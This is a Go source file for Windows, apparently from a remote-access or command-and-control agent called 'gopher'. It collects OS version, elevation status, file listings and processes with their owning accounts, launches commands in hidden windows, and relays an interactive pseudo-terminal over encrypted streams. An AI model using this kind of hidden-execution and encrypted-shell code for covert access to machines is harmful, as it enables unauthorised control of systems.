//go:build windows
// +build windows

package functions

import (
	"crypto/cipher"
	"fmt"
	"github.com/gabemarshall/pty"
	"golang.org/x/sys/windows"
	"gopher/utils"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

type OSVersionInfoEx struct {
	dwOSVersionInfoSize uint32
	dwMajorVersion      uint32
	dwMinorVersion      uint32
	dwBuildNumber       uint32
	dwPlatformId        uint32
	szCSDVersion        [128]uint16
	wServicePackMajor   uint16
	wServicePackMinor   uint16
	wSuiteMask          uint16
	wProductType        byte
	wReserved           byte
}

func GetCP() (uint32, uint32) {
	modkernel := syscall.NewLazyDLL("kernel32.dll")
	acp, _, _ := modkernel.NewProc("GetACP").Call()
	oemcp, _, _ := modkernel.NewProc("GetOEMCP").Call()

	return uint32(acp), uint32(oemcp)
}

func GetOsVersion() (string, error) {
	modntdll := syscall.NewLazyDLL("ntdll.dll")
	procRtlGetVersion := modntdll.NewProc("RtlGetVersion")

	var info OSVersionInfoEx
	info.dwOSVersionInfoSize = uint32(unsafe.Sizeof(info))

	ret, _, _ := procRtlGetVersion.Call(uintptr(unsafe.Pointer(&info)))
	if ret != 0 {
		return "", fmt.Errorf("RtlGetVersion call failed")
	}

	version := fmt.Sprintf("Windows %d.%d build %d", info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber)
	return version, nil
}

func IsElevated() bool {
	token := windows.GetCurrentProcessToken()
	return token.IsElevated()
}

func NormalizePath(relPath string) (string, error) {
	if strings.HasPrefix(relPath, "~") {
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		relPath = filepath.Join(usr.HomeDir, relPath[1:])
	}

	path, err := filepath.Abs(relPath)
	if err != nil {
		return "", err
	}

	path = filepath.Clean(path)
	return path, nil
}

func GetListing(path string) ([]utils.FileInfo, error) {
	var Files []utils.FileInfo

	entries, err := os.ReadDir(path)
	if err != nil {
		return Files, err
	}

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			return Files, err
		}

		fileInfo := utils.FileInfo{
			Mode:     "",
			Nlink:    0,
			User:     "",
			Group:    "",
			Size:     info.Size(),
			Date:     info.ModTime().Format("02/01/2006 15:04"),
			Filename: entry.Name(),
			IsDir:    info.IsDir(),
		}
		Files = append(Files, fileInfo)
	}
	return Files, nil
}

/// Process

func getSessionID(pid uint32) (int, error) {
	var sessionID uint32
	err := windows.ProcessIdToSessionId(pid, &sessionID)
	if err != nil {
		return -1, err
	}
	return int(sessionID), nil
}

func getProcessContext(pid uint32) (string, error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "", err
	}
	defer syscall.CloseHandle(handle)

	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
		return "", err
	}
	defer token.Close()

	var tokenUser *syscall.Tokenuser
	n := uint32(50)
	for {
		b := make([]byte, n)
		e := syscall.GetTokenInformation(token, syscall.TokenUser, &b[0], uint32(len(b)), &n)
		if e == nil {
			tokenUser = (*syscall.Tokenuser)(unsafe.Pointer(&b[0]))
			break
		}
		if e != syscall.ERROR_INSUFFICIENT_BUFFER {
			return "", e
		}
		if n <= uint32(len(b)) {
			return "", e
		}
	}

	owner, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	return fmt.Sprintf("%s\\%s", domain, owner), nil
}

func GetProcesses() ([]utils.PsInfo, error) {
	var Processes []utils.PsInfo

	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err = syscall.Process32First(handle, &entry); err != nil {
		return nil, err
	}

	for {
		end := 0
		for {
			if entry.ExeFile[end] == 0 {
				break
			}
			end++
		}

		context, _ := getProcessContext(entry.ProcessID)

		tty := ""
		sessId, err := getSessionID(entry.ProcessID)
		if err == nil {
			tty = strconv.Itoa(int(sessId))
		}

		psInfo := utils.PsInfo{
			Pid:     int(entry.ProcessID),
			Ppid:    int(entry.ParentProcessID),
			Context: context,
			Tty:     tty,
			Process: syscall.UTF16ToString(entry.ExeFile[:end]),
		}
		Processes = append(Processes, psInfo)

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			break
		}
	}

	return Processes, nil
}

func ProcessSettings(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
}

func IsProcessRunning(cmd *exec.Cmd) bool {
	if cmd.Process == nil {
		return false
	}
	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
		return false
	}
	return true
}

func StartPtyCommand(process *exec.Cmd, columns uint16, rows uint16) (any, error) {
	windowSize := pty.Winsize{Rows: rows, Cols: columns}
	return pty.StartWithSize(process, &windowSize)
}

func StopPty(Pipe any) error {
	src := Pipe.(pty.Pty)
	return src.Close()
}

func RelayConnToPty(to any, from *cipher.StreamReader) {
	pipe := to.(pty.Pty)
	io.Copy(pipe, from)
}

func RelayPtyToConn(to *cipher.StreamWriter, from any) {
	pipe := from.(pty.Pty)
	io.Copy(to, pipe)
}
